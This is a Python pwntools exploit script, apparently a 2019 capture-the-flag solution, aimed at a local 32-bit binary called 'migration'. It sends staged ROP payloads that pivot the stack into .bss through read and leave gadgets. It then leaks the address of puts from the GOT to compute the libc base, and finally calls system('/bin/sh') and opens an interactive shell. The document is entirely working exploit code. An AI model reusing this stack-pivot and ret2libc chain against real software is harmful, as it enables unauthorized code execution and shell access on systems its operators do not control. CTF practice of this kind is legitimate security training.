#!/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2019 ctf <hailongnan@163.com>
#
# Distributed under terms of the MIT license.

from pwn import *

context.log_level = "debug"

libc = ELF("/lib/i386-linux-gnu/libc.so.6")

code=ELF("migration")
bss_addr= code.bss()    #0x804a00c
read_addr = code.plt['read']
buf = bss_addr + 0x300
leave_addr = 0x8048418
payload = ["\x90"*0x28,buf,read_addr,leave_addr,0x0,buf,0x64]
payload_1 = flat(payload)

r=process("./migration")
#gdb.attach(r)
#input("#")
r.sendafter(":\n",payload_1)

#input("#")
pop_ebx = 0x0804836d
buf2 = buf+0x100
payload_2 = [buf2,code.plt['puts'],pop_ebx,code.got['puts'],code.plt['read'],leave_addr,0x0,buf2,0x64]
payload_3 = flat(payload_2)
r.send(payload_3)
libc.address = u32(r.recv()[:4])-libc.symbols['puts']

system = libc.symbols['system']
bin_sh = libc.search("/bin/sh").next()
payload=[0x0,system,0x0,bin_sh]
payload = flat(payload)
r.send(payload)
r.interactive()
